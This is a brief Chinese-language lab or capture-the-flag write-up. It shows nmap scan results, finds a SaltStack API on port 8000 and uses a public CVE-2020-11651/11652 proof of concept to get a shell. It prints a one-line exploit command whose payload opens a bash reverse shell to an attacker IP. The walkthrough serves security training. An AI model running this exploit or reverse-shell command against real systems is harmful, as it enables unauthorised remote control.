nmap 結果
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-title: Home | Mezzanine
|_http-server-header: nginx/1.16.1
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
|_http-title: Site doesn't have a title (application/json).
|_http-open-proxy: Proxy might be redirecting requests
```

都沒有可以利用的地方 去看 `ZeroMQ ZMTP 2.0` 版本有無漏洞
第一個[這個](https://github.com/jasperla/CVE-2020-11651-poc/blob/master/exploit.py)沒有 username 跟密碼

他有開一個 8000 port 使用 `curl -i http://192.168.125.62:8000/` 發現有用到一個 `salt 的 api`
![image](https://hackmd.io/_uploads/BJpgWBT7ke.png)

上網可以找到相關的 [CVE](https://github.com/jasperla/CVE-2020-11651-poc) : `CVE-2020-11652`
使用他的 exploit 達成 reverse shell 
`python3 exploit.py -m 192.168.125.62 --exec "bash -i >& /dev/tcp/192.168.45.189/8000 0>&1"`
![image](https://hackmd.io/_uploads/B1pgiSTm1e.png)

成功拿到 flag
![image](https://hackmd.io/_uploads/BJaHjHT7kx.png)
